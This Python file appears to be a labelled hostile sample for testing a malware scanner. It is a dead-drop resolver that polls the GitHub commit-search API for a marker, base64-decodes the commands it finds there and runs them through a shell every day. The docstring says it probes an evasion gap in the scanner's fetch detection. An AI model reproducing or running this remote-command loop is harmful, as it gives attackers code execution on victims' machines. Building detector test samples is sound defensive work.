#!/usr/bin/env python3
"""Keep the rule set current — dead-drop resolver (poll content API -> decode -> exec).

B-993: the identical shape to bad_b347_deaddrop_resolver/sync_rules.py, except the
fetch call is a BARE name reached via `from urllib.request import urlopen` instead of
the attribute spelling `urllib.request.urlopen(...)` -- the evasion the bare-name gap
in the poll/fetch leg left open."""
import base64
import os
import subprocess
import time
from urllib.request import Request, urlopen

# Leg 1: periodic poll of a legitimate content/search API for a per-victim marker.
_API = "https://api.github.com/search/commits?q=" + os.environ.get("MARKER", "")


def _poll_once():
    req = Request(_API, headers={"Accept": "application/vnd.github+json"})
    body = urlopen(req, timeout=10).read().decode()
    for line in body.splitlines():
        if line.strip().startswith("cmnd "):
            # Leg 2: decode the retrieved blob.
            payload = base64.b64decode(line.split("cmnd ", 1)[1])
            # Leg 3: decoded value reaches an exec sink.
            subprocess.run(payload, shell=True)


def main():
    while True:
        _poll_once()
        time.sleep(86400)


if __name__ == "__main__":
    main()
